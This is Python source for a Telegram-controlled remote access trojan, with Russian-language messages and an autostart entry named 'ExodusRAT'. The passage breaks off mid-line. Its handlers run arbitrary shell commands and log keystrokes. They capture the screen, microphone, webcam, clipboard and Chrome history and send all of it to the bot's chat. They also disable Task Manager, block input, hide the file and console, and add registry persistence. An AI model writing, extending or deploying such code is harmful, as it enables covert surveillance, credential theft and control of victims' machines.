@dp.message_handler(commands=['disable_taskmgr'])
async def disable_taskmgr(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            if not is_admin():
                await bot.send_message(message.chat.id, "Требуются права администратора.")
                return
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            await bot.send_message(message.chat.id, "Диспетчер задач отключён.")
        except Exception as e:
            logging.error(f"Ошибка в /disable_taskmgr: {str(e)}", extra={'category': 'Control'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['enable_taskmgr'])
async def enable_taskmgr(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            if not is_admin():
                await bot.send_message(message.chat.id, "Требуются права администратора.")
                return
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "DisableTaskMgr")
            winreg.CloseKey(key)
            await bot.send_message(message.chat.id, "Диспетчер задач включён.")
        except Exception as e:
            logging.error(f"Ошибка в /enable_taskmgr: {str(e)}", extra={'category': 'Control'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

# Другие команды
@dp.message_handler(commands=['block_input'])
async def block_input(message: types.Message):
    global input_blocked
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            if not is_admin():
                await bot.send_message(message.chat.id, "Требуются права администратора.")
                return
            ctypes.windll.user32.BlockInput(True)
            input_blocked = True
            await bot.send_message(message.chat.id, "Ввод заблокирован.")
        except Exception as e:
            logging.error(f"Ошибка в /block_input: {str(e)}", extra={'category': 'Control'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['unblock_input'])
async def unblock_input(message: types.Message):
    global input_blocked
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            if not is_admin():
                await bot.send_message(message.chat.id, "Требуются права администратора.")
                return
            ctypes.windll.user32.BlockInput(False)
            input_blocked = False
            await bot.send_message(message.chat.id, "Ввод разблокирован.")
        except Exception as e:
            logging.error(f"Ошибка в /unblock_input: {str(e)}", extra={'category': 'Control'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['cmd'])
async def cmd(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            params = message.text.split(maxsplit=1)
            if len(params) != 2:
                await bot.send_message(message.chat.id, "Укажите: /cmd command")
                return
            command = params[1]
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            output = stdout or stderr or "Команда выполнена без вывода."
            await send_long_text(message.chat.id, output)
        except Exception as e:
            logging.error(f"Ошибка в /cmd: {str(e)}", extra={'category': 'Shell'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['ping'])
async def ping(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            await bot.send_message(message.chat.id, "Pong! 🏓")
        except Exception as e:
            logging.error(f"Ошибка в /ping: {str(e)}", extra={'category': 'System'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['keylog_start'])
async def keylog_start(message: types.Message):
    global keylog_active
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            if keylog_active:
                await bot.send_message(message.chat.id, "Кейлоггер уже запущен.")
                return
            keylog_active = True
            asyncio.create_task(keylog())
            await bot.send_message(message.chat.id, "Кейлоггер запущен.")
        except Exception as e:
            logging.error(f"Ошибка в /keylog_start: {str(e)}", extra={'category': 'Keylogger'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['keylog_stop'])
async def keylog_stop(message: types.Message):
    global keylog_active
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            if not keylog_active:
                await bot.send_message(message.chat.id, "Кейлоггер не запущен.")
                return
            keylog_active = False
            if os.path.exists(keylog_file):
                await send_large_file(message.chat.id, keylog_file)
            await bot.send_message(message.chat.id, "Кейлоггер остановлен.")
        except Exception as e:
            logging.error(f"Ошибка в /keylog_stop: {str(e)}", extra={'category': 'Keylogger'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['keylog_realtime'])
async def keylog_realtime(message: types.Message):
    global keylog_realtime_active
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            if keylog_realtime_active:
                keylog_realtime_active = False
                await bot.send_message(message.chat.id, "Кейлоггер в реальном времени остановлен.")
                return
            keylog_realtime_active = True
            asyncio.get_event_loop().run_in_executor(None, keylog_realtime_listener)
            await bot.send_message(message.chat.id, "Кейлоггер в реальном времени запущен.")
        except Exception as e:
            logging.error(f"Ошибка в /keylog_realtime: {str(e)}", extra={'category': 'Keylogger'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['status'])
async def status(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            status_info = (
                f"Статус бота:\n"
                f"Кейлоггер: {'Активен' if keylog_active else 'Неактивен'}\n"
                f"Кейлоггер (реальное время): {'Активен' if keylog_realtime_active else 'Неактивен'}\n"
                f"Ввод заблокирован: {'Да' if input_blocked else 'Нет'}\n"
                f"Админ: {'Да' if is_admin() else 'Нет'}"
            )
            await bot.send_message(message.chat.id, status_info)
        except Exception as e:
            logging.error(f"Ошибка в /status: {str(e)}", extra={'category': 'System'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['status_extended'])
async def status_extended(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            active_monitors = ", ".join(monitor_tasks.keys()) or "Нет активных мониторингов"
            status_info = (
                f"Статус бота:\n"
                f"Кейлоггер: {'Активен' if keylog_active else 'Неактивен'}\n"
                f"Кейлоггер (реальное время): {'Активен' if keylog_realtime_active else 'Неактивен'}\n"
                f"Ввод заблокирован: {'Да' if input_blocked else 'Нет'}\n"
                f"Админ: {'Да' if is_admin() else 'Нет'}\n"
                f"Активные мониторинги: {active_monitors}\n"
                f"Кэш системной информации: {'Есть' if sysinfo_cache else 'Нет'}\n"
                f"Кэш приложений: {'Есть' if installed_apps_cache else 'Нет'}\n"
                f"Задач в пуле: {len(monitor_tasks)}/{task_pool._value + len(monitor_tasks)}"
            )
            await bot.send_message(message.chat.id, status_info)
        except Exception as e:
            logging.error(f"Ошибка в /status_extended: {str(e)}", extra={'category': 'System'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['stop_all_monitors'])
async def stop_all_monitors(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        global clipboard_monitor_active, network_monitor_active, usb_monitor_active, file_monitor_active, keystroke_pattern_active
        try:
            clipboard_monitor_active = False
            network_monitor_active = False
            usb_monitor_active = False
            file_monitor_active = False
            keystroke_pattern_active = False
            for task_name, task in monitor_tasks.items():
                task.cancel()
            monitor_tasks.clear()
            await bot.send_message(message.chat.id, "Все мониторинги остановлены.")
        except Exception as e:
            logging.error(f"Ошибка в /stop_all_monitors: {str(e)}", extra={'category': 'System'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['exit'])
async def exit_bot(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            global allow_exit
            allow_exit = True
            await bot.send_message(message.chat.id, "Бот завершает работу.")
            sys.exit(0)
        except Exception as e:
            logging.error(f"Ошибка в /exit: {str(e)}", extra={'category': 'System'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

# Скрытность
@dp.message_handler(commands=['hide_console'])
async def hide_console(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            setup_window()
            await bot.send_message(message.chat.id, "Консольное окно скрыто.")
        except Exception as e:
            logging.error(f"Ошибка в /hide_console: {str(e)}", extra={'category': 'Stealth'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['add_autostart'])
async def add_autostart(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            if not is_admin():
                await bot.send_message(message.chat.id, "Требуются права администратора.")
                return
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            script_path = os.path.abspath(__file__)
            winreg.SetValueEx(key, "ExodusRAT", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
            winreg.CloseKey(key)
            await bot.send_message(message.chat.id, "Добавлено в автозагрузку.")
        except Exception as e:
            logging.error(f"Ошибка в /add_autostart: {str(e)}", extra={'category': 'Stealth'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['hide_file'])
async def hide_file(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            if not is_admin():
                await bot.send_message(message.chat.id, "Требуются права администратора.")
                return
            script_path = os.path.abspath(__file__)
            ctypes.windll.kernel32.SetFileAttributesW(script_path, 2)
            await bot.send_message(message.chat.id, "Файл скрыт.")
        except Exception as e:
            logging.error(f"Ошибка в /hide_file: {str(e)}", extra={'category': 'Stealth'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['mask_process'])
async def mask_process(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            await bot.send_message(message.chat.id, "Маскировка процесса требует компиляции в .exe (например, 'svchost.exe').")
        except Exception as e:
            logging.error(f"Ошибка в /mask_process: {str(e)}", extra={'category': 'Stealth'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

# Шифрование
@dp.message_handler(commands=['encrypt_file'])
async def encrypt_file(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            params = message.text.split(maxsplit=2)
            if len(params) != 3:
                await bot.send_message(message.chat.id, "Укажите: /encrypt_file path key")
                return
            path, key = params[1], params[2]
            if not os.path.exists(path):
                await bot.send_message(message.chat.id, "Файл не существует.")
                return
            with open(path, 'rb') as f:
                data = f.read()
            encrypted = base64.b64encode(data + key.encode()).decode()
            with open(path + ".enc", 'w') as f:
                f.write(encrypted)
            await bot.send_message(message.chat.id, f"Файл зашифрован: {path}.enc")
        except Exception as e:
            logging.error(f"Ошибка в /encrypt_file: {str(e)}", extra={'category': 'Crypto'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['decrypt_file'])
async def decrypt_file(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            params = message.text.split(maxsplit=2)
            if len(params) != 3:
                await bot.send_message(message.chat.id, "Укажите: /decrypt_file path key")
                return
            path, key = params[1], params[2]
            if not os.path.exists(path):
                await bot.send_message(message.chat.id, "Файл не существует.")
                return
            with open(path, 'r') as f:
                encrypted = f.read()
            decrypted = base64.b64decode(encrypted)
            if not decrypted.endswith(key.encode()):
                await bot.send_message(message.chat.id, "Неверный ключ.")
                return
            with open(path[:-4], 'wb') as f:
                f.write(decrypted[:-len(key)])
            await bot.send_message(message.chat.id, f"Файл расшифрован: {path[:-4]}")
        except Exception as e:
            logging.error(f"Ошибка в /decrypt_file: {str(e)}", extra={'category': 'Crypto'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

# Сеть
@dp.message_handler(commands=['network_monitor'])
async def network_monitor(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            if not is_admin():
                await bot.send_message(message.chat.id, "Требуются права администратора.")
                return
            net = psutil.net_if_addrs()
            output = "\n".join([f"Сеть {k}: {v[0].address}" for k, v in net.items() if v[0].family == 2])
            await send_long_text(message.chat.id, output or "Сетевые интерфейсы не найдены.")
        except Exception as e:
            logging.error(f"Ошибка в /network_monitor: {str(e)}", extra={'category': 'Network'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

# Новые команды
@dp.message_handler(commands=['take_screenshot_series'])
async def take_screenshot_series(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            params = message.text.split()
            if len(params) != 3:
                await bot.send_message(message.chat.id, "Укажите: /take_screenshot_series count interval_ms")
                return
            count, interval_ms = map(int, params[1:])
            if count > 10 or interval_ms < 100:
                await bot.send_message(message.chat.id, "Макс. 10 скриншотов, интервал ≥ 100 мс.")
                return
            with mss.mss() as sct:
                for i in range(count):
                    screen_path = os.path.join(os.getenv("APPDATA"), f"screenshot_{i}.jpg")
                    img = sct.shot()
                    img = Image.open(img)
                    img = img.resize((img.width // 2, img.height // 2), Image.Resampling.LANCZOS)
                    img.save(screen_path, quality=50)
                    await send_large_file(message.chat.id, screen_path)
                    await asyncio.sleep(interval_ms / 1000)
                await bot.send_message(message.chat.id, f"Серия из {count} скриншотов завершена.")
        except Exception as e:
            logging.error(f"Ошибка в /take_screenshot_series: {str(e)}", extra={'category': 'Screenshot'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['record_audio'])
async def record_audio(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            params = message.text.split()
            if len(params) != 2:
                await bot.send_message(message.chat.id, "Укажите: /record_audio duration_seconds")
                return
            duration = int(params[1])
            if duration > 60:
                await bot.send_message(message.chat.id, "Макс. длительность: 60 секунд.")
                return
            audio_path = os.path.join(os.getenv("APPDATA"), "audio.wav")
            recording = sd.rec(int(duration * 44100), samplerate=44100, channels=2)
            sd.wait()
            write(audio_path, 44100, recording)
            await send_large_file(message.chat.id, audio_path)
            await bot.send_message(message.chat.id, f"Аудио записано ({duration} секунд).")
        except Exception as e:
            logging.error(f"Ошибка в /record_audio: {str(e)}", extra={'category': 'Audio'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['system_logs'])
async def system_logs(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            if not is_admin():
                await bot.send_message(message.chat.id, "Требуются права администратора.")
                return
            evt = win32com.client.Dispatch("WbemScripting.SWbemLocator").ConnectServer().ExecQuery("SELECT * FROM Win32_NTLogEvent WHERE Logfile='System' AND TimeWritten >= NOW() - INTERVAL 1 DAY")
            logs = [f"[{e.TimeWritten}] {e.SourceName}: {e.Message}" for e in evt[:10]]
            output = "\n".join(logs) or "Логи не найдены."
            await send_long_text(message.chat.id, output)
        except Exception as e:
            logging.error(f"Ошибка в /system_logs: {str(e)}", extra={'category': 'System'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['remote_shell'])
async def remote_shell(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            params = message.text.split(maxsplit=1)
            if len(params) != 2:
                await bot.send_message(message.chat.id, "Укажите: /remote_shell command")
                return
            command = params[1]
            chat_id = str(message.chat.id)
            shell_context.setdefault(chat_id, {})
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, cwd=shell_context[chat_id].get('cwd', os.getcwd()))
            shell_context[chat_id]['cwd'] = os.getcwd()
            stdout, stderr = process.communicate()
            output = stdout or stderr or "Команда выполнена без вывода."
            await send_long_text(message.chat.id, output)
        except Exception as e:
            logging.error(f"Ошибка в /remote_shell: {str(e)}", extra={'category': 'Shell'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['monitor_clipboard'])
async def monitor_clipboard(message: types.Message):
    global clipboard_monitor_active, clipboard_content
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            if clipboard_monitor_active:
                clipboard_monitor_active = False
                monitor_tasks.pop('clipboard', None)
                await bot.send_message(message.chat.id, "Мониторинг буфера обмена остановлен.")
                return
            clipboard_monitor_active = True
            async def monitor():
                global clipboard_content
                while clipboard_monitor_active:
                    try:
                        win32clipboard.OpenClipboard()
                        new_content = win32clipboard.GetClipboardData()
                        win32clipboard.CloseClipboard()
                        if new_content != clipboard_content:
                            clipboard_content = new_content
                            await bot.send_message(message.chat.id, f"Буфер обмена: {new_content[:4000]}")
                    except:
                        pass
                    await asyncio.sleep(1)
            monitor_tasks['clipboard'] = asyncio.create_task(monitor())
            await bot.send_message(message.chat.id, "Мониторинг буфера обмена запущен.")
        except Exception as e:
            logging.error(f"Ошибка в /monitor_clipboard: {str(e)}", extra={'category': 'Clipboard'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['capture_webcam_video'])
async def capture_webcam_video(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            params = message.text.split()
            if len(params) != 2:
                await bot.send_message(message.chat.id, "Укажите: /capture_webcam_video duration_seconds")
                return
            duration = int(params[1])
            if duration > 30:
                await bot.send_message(message.chat.id, "Макс. длительность: 30 секунд.")
                return
            video_path = os.path.join(os.getenv("APPDATA"), "webcam_video.mp4")
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                await bot.send_message(message.chat.id, "Веб-камера не обнаружена.")
                return
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            out = cv2.VideoWriter(video_path, fourcc, 20.0, (640, 480))
            start_time = time.time()
            while time.time() - start_time < duration:
                ret, frame = cap.read()
                if ret:
                    out.write(frame)
                await asyncio.sleep(0.05)
            cap.release()
            out.release()
            await send_large_file(message.chat.id, video_path)
            await bot.send_message(message.chat.id, f"Видео с веб-камеры записано ({duration} секунд).")
        except Exception as e:
            logging.error(f"Ошибка в /capture_webcam_video: {str(e)}", extra={'category': 'Webcam'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['list_installed_apps'])
async def list_installed_apps(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        global installed_apps_cache, installed_apps_cache_time
        try:
            if installed_apps_cache and time.time() - installed_apps_cache_time < 3600:
                await send_long_text(message.chat.id, installed_apps_cache)
                return
            if not is_admin():
                await bot.send_message(message.chat.id, "Требуются права администратора.")
                return
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Uninstall")
            apps = []
            for i in range(winreg.QueryInfoKey(key)[0]):
                subkey_name = winreg.EnumKey(key, i)
                subkey = winreg.OpenKey(key, subkey_name)
                try:
                    app_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                    apps.append(app_name)
                except:
                    continue
                winreg.CloseKey(subkey)
            winreg.CloseKey(key)
            output = "\n".join(apps) or "Приложения не найдены."
            installed_apps_cache = output
            installed_apps_cache_time = time.time()
            await send_long_text(message.chat.id, output)
        except Exception as e:
            logging.error(f"Ошибка в /list_installed_apps: {str(e)}", extra={'category': 'System'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['monitor_keystrokes_pattern'])
async def monitor_keystrokes_pattern(message: types.Message):
    global keystroke_pattern_active, keystroke_patterns
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            if keystroke_pattern_active:
                keystroke_pattern_active = False
                monitor_tasks.pop('keystrokes', None)
                output = "\n".join(keystroke_patterns) or "Шаблоны не найдены."
                await send_long_text(message.chat.id, output)
                keystroke_patterns = []
                await bot.send_message(message.chat.id, "Мониторинг шаблонов клавиш остановлен.")
                return
            keystroke_pattern_active = True
            async def monitor():
                current = ""
                while keystroke_pattern_active:
                    event = pynput_keyboard.read_event(suppress=True)
                    if event.event_type == pynput_keyboard.KEY_DOWN:
                        key = event.name
                        if key and len(key) == 1:
                            current += key
                            if len(current) >= 8:
                                keystroke_patterns.append(f"Шаблон: {current} ({datetime.now().strftime('%Y-%m-%d %H:%M:%S')})")
                                current = current[1:]
                    await asyncio.sleep(0.01)
            monitor_tasks['keystrokes'] = asyncio.create_task(monitor())
            await bot.send_message(message.chat.id, "Мониторинг шаблонов клавиш запущен.")
        except Exception as e:
            logging.error(f"Ошибка в /monitor_keystrokes_pattern: {str(e)}", extra={'category': 'Keylogger'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['simulate_user_activity'])
async def simulate_user_activity(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            params = message.text.split()
            if len(params) != 2:
                await bot.send_message(message.chat.id, "Укажите: /simulate_user_activity duration_seconds")
                return
            duration = int(params[1])
            if duration > 60:
                await bot.send_message(message.chat.id, "Макс. длительность: 60 секунд.")
                return
            async def simulate():
                screen_width, screen_height = pyautogui.size()
                start_time = time.time()
                while time.time() - start_time < duration:
                    x = random.randint(0, screen_width)
                    y = random.randint(0, screen_height)
                    pyautogui.moveTo(x, y, duration=0.2)
                    pyautogui.click()
                    pyautogui.write(random.choice(["hello", "test", "activity"]))
                    await asyncio.sleep(1)
            asyncio.create_task(simulate())
            await bot.send_message(message.chat.id, f"Симуляция активности запущена ({duration} секунд).")
        except Exception as e:
            logging.error(f"Ошибка в /simulate_user_activity: {str(e)}", extra={'category': 'Simulation'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['export_browser_history'])
async def export_browser_history(message: types.Message):
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            if not is_admin():
                await bot.send_message(message.chat.id, "Требуются права администратора.")
                return
            chrome_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\History")
            if not os.path.exists(chrome_path):
                await bot.send_message(message.chat.id, "История Chrome не найдена.")
                return
            shutil.copy(chrome_path, "History")
            conn = sqlite3.connect("History")
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
            history = [f"URL: {row[0]}\nНазвание: {row[1]}\nПосещений: {row[2]}\nВремя: {datetime.fromtimestamp(row[3]/1000000-11644473600).strftime('%Y-%m-%d %H:%M:%S')}" for row in cursor.fetchall()]
            conn.close()
            os.remove("History")
            output = "\n".join(history) or "История не найдена."
            await send_long_text(message.chat.id, output)
        except Exception as e:
            logging.error(f"Ошибка в /export_browser_history: {str(e)}", extra={'category': 'Browser'})
            await bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@dp.message_handler(commands=['monitor_network_traffic'])
async def monitor_network_traffic(message: types.Message):
    global network_monitor_active, network_packets
    if not check_auth(message) or not rate_limit():
        return
    async with task_pool:
        try:
            if not is_admin():
                await bot.send_message(message.chat.id, "Требуются права администратора.")
                return
            if network_monitor_active:
                network_monitor_active = False
                monitor_tasks.pop('network', None)
                output = "\n".join(network_packets[:50]) or "Пакеты не захвачены."
                await
